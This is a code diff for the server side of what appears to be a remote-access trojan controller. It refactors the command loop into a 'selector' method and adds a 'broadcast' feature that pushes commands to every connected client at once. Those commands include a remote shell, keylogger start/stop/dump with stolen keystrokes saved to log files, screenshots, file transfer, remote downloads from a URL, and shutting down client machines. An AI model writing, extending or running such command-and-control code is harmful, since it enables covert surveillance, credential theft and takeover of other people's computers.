@@ -46,7 +46,7 @@ interface_help = """--h | See this Help Message
 --b | Run Connection in Background"""
 
 turtle_help = """--h | See this Help Message
---a (Command) | Send shell command to all connected clients
+--a | Broadcast command to all connected clients
 --l | List connected Clients
 --i (ID) | Connect to a Client"""
 
@@ -250,7 +250,9 @@ class MultiServer(object):
             except Exception as e:
                 del privateKey
                 del publicKey
-                logging.debug(e)
+                error_class = e.__class__.__name__
+                detail = e.args[0]
+                logging.debug('{0}: {1}'.format(error_class, detail))
 
     def list_connections(self, _print=True):
         """ List all connections """
@@ -403,105 +405,123 @@ class MultiServer(object):
                 self.send(conn, b'--q')
                 break
 
+
+    def selector(self, conn, command):
+        if '--b' in command:
+            return True
+        if '--e' in command:
+            self.shell(conn)
+            return
+        if '--i' in command:
+            self.python_interpreter(conn)
+            return
+        if '--c' in command:
+            text_to_copy = input('Text to copy: ')
+            self.send(conn, json_dumps(['--c', text_to_copy]))
+            self.receive(conn, _print=False)
+            print('Copied Successfully')
+            return
+        if '--u' in command:
+            self.send(conn, json_dumps(['--u']))
+            info = self.all_addresses[self.all_connections.index(conn)]
+            print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
+            self.receive(conn)
+            return
+        if command[:3] == '--k':
+            if command[4:].strip() == 'start':
+                self.send(conn, json_dumps(['--k start']))
+                self.receive(conn)
+                return
+            if command[4:].strip() == 'stop':
+                self.send(conn, json_dumps(['--k stop']))
+                self.receive(conn)
+                return
+            if command[4:].strip() == 'dump':
+                self.send(conn, json_dumps(['--k dump']))
+                data = self.receive(conn, _print=False)
+                if data == b'<NOTRUNNING>':
+                    print('Keylogger not running\n')
+                    return
+                with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
+                    f.write(data)
+                print('Logs saved')
+                return
+        if '--p' in command:
+            self.send(conn, json_dumps(['--p']))
+            self.receive(conn)
+            return
+        if command[:3] == '--x':
+            command = command[4:].strip()
+            if command == '1':
+                self.send(conn, json_dumps(['--x', '1']))
+                self.receive(conn)
+                time.sleep(2)
+                conn.close()
+                self.list_connections(_print=False)
+                return True
+            elif command == '2':
+                self.send(conn, json_dumps(['--x', '2']))
+                self.receive(conn)
+                time.sleep(2)
+                conn.close()
+                self.list_connections(_print=False)
+                return True
+        if command[:3] == '--q':
+            command = command[4:].strip()
+            if command == '1':
+                self.send(conn, json_dumps(['--q', '1']))
+                self.receive(conn)
+                return
+            elif command == '2':
+                self.send(conn, json_dumps(['--q', '2']))
+                print('Shutdown Client Machine.')
+                self.list_connections(_print=False)
+                return True
+            elif command == '3':
+                self.send(conn, json_dumps(['--q', '3']))
+                print('Restarted Client Machine.')
+                self.list_connections(_print=False)
+                return True
+        if '--d' in command:
+            file_url = input('File URL: ')
+            file_name = input('Filename: ')
+            self.send(conn, json_dumps(['--d', file_url, file_name]))
+            self.receive(conn)
+            return
+        if '--s' in command:
+            self.send_file(conn)
+            return
+        if '--r' in command:
+            self.receive_file(conn)
+            return
+        if '--g' in command:
+            self.screenshot(conn)
+            return
+        if '--h' in command:
+            print(interface_help)
+            return
+        print("Invalid command: '--h' for help.")
+
+
+    def broadcast(self, command):
+        for conn in self.all_connections:
+            try:
+                print('Response from {0}:'.format(self.all_addresses[self.all_connections.index(conn)][0]))
+                self.selector(conn, command)
+            except Exception as e:
+                error_class = e.__class__.__name__
+                detail = e.args[0]
+                print('{0} at {1}: {2}'.format(error_class, self.all_addresses[self.all_connections.index(conn)][0], detail))
+
+
     def interface(self, conn, target):
         """ CLI Interface to Client """
         ip = self.all_addresses[self.all_connections.index(conn)][0]
         while True:
             command = input('{0}> '.format(ip))
-            if '--b' in command:
+            if self.selector(conn, command):
                 break
-            if '--e' in command:
-                self.shell(conn)
-                continue
-            if '--i' in command:
-                self.python_interpreter(conn)
-                continue
-            if '--c' in command:
-                text_to_copy = input('Text to copy: ')
-                self.send(conn, json_dumps(['--c', text_to_copy]))
-                self.receive(conn, _print=False)
-                print('Copied Successfully')
-                continue
-            if '--u' in command:
-                self.send(conn, json_dumps(['--u']))
-                info = self.all_addresses[self.all_connections.index(conn)]
-                print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
-                self.receive(conn)
-                continue
-            if command[:3] == '--k':
-                if command[4:].strip() == 'start':
-                    self.send(conn, json_dumps(['--k start']))
-                    self.receive(conn)
-                    continue
-                if command[4:].strip() == 'stop':
-                    self.send(conn, json_dumps(['--k stop']))
-                    self.receive(conn)
-                    continue
-                if command[4:].strip() == 'dump':
-                    self.send(conn, json_dumps(['--k dump']))
-                    data = self.receive(conn, _print=False)
-                    if data == b'<NOTRUNNING>':
-                        print('Keylogger not running\n')
-                        continue
-                    with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
-                        f.write(data)
-                    print('Logs saved')
-                    continue
-            if '--p' in command:
-                self.send(conn, json_dumps(['--p']))
-                self.receive(conn)
-                continue
-            if command[:3] == '--x':
-                command = command[4:].strip()
-                if command == '1':
-                    self.send(conn, json_dumps(['--x', '1']))
-                    self.receive(conn)
-                    time.sleep(2)
-                    conn.close()
-                    self.list_connections(_print=False)
-                    return
-                elif command == '2':
-                    self.send(conn, json_dumps(['--x', '2']))
-                    self.receive(conn)
-                    time.sleep(2)
-                    conn.close()
-                    self.list_connections(_print=False)
-                    return
-            if command[:3] == '--q':
-                command = command[4:].strip()
-                if command == '1':
-                    self.send(conn, json_dumps(['--q', '1']))
-                    self.receive(conn)
-                    continue
-                elif command == '2':
-                    self.send(conn, json_dumps(['--q', '2']))
-                    print('Shutdown Client Machine.')
-                    self.list_connections(_print=False)
-                    return
-                elif command == '3':
-                    self.send(conn, json_dumps(['--q', '3']))
-                    print('Restarted Client Machine.')
-                    self.list_connections(_print=False)
-                    return
-            if '--d' in command:
-                file_url = input('File URL: ')
-                file_name = input('Filename: ')
-                self.send(conn, json_dumps(['--d', file_url, file_name]))
-                self.receive(conn)
-                continue
-            if '--s' in command:
-                self.send_file(conn)
-                continue
-            if '--r' in command:
-                self.receive_file(conn)
-                continue
-            if '--g' in command:
-                self.screenshot(conn)
-                continue
-            if '--h' in command:
-                print(interface_help)
-                continue
-            print("Invalid command: '--h' for help.")
+
 
     def turtle(self):
         """ Connection Selector """
@@ -513,21 +533,7 @@ class MultiServer(object):
                     print(turtle_help)
                     continue
                 elif command[:3] == '--a':
-                    if len(command) > 4:
-                        for client in self.all_connections:
-                            try:
-                                self.send(client, json_dumps([command[4:]]))
-                                print('Response from {}: '.format(self.all_addresses[self.all_connections.index(client)][0]))
-                                while 1:
-                                    response = self.receive(client, _print=False)
-                                    if response == b'<DONE>':
-                                        break
-                                    print(response.decode())
-                                    self.send(client, b'<LISTENING>')
-                            except Exception as e:
-                                print('Error at {0}: {1}'.format(self.all_addresses[self.all_connections.index(client)][0], str(e)))
-                    else:
-                        print("Arguments missing, '--h' for help")
+                    self.broadcast(input('Command to broadcast: '))
                     continue
                 elif command == '--l':
                     self.list_connections()
@@ -538,7 +544,9 @@ class MultiServer(object):
                         try:
                             self.interface(conn, target)
                         except Exception as e:
-                            print('Connection lost: {0}'.format(str(e)))
+                            error_class = e.__class__.__name__
+                            detail = e.args[0]
+                            print('Connection lost: {0}: {1}'.format(error_class, detail))
                             index = self.all_connections.index(conn)
                             del self.all_connections[index]
                             del self.all_addresses[index]
@@ -548,7 +556,9 @@ class MultiServer(object):
                     continue
                 print("Invalid command: '--h' for help.")
             except Exception as e:
-                print('Error: {0}'.format(str(e)))
+                error_class = e.__class__.__name__
+                detail = e.args[0]
+                print('{0}: {1}'.format(error_class, detail))
 
 
 def create_workers():
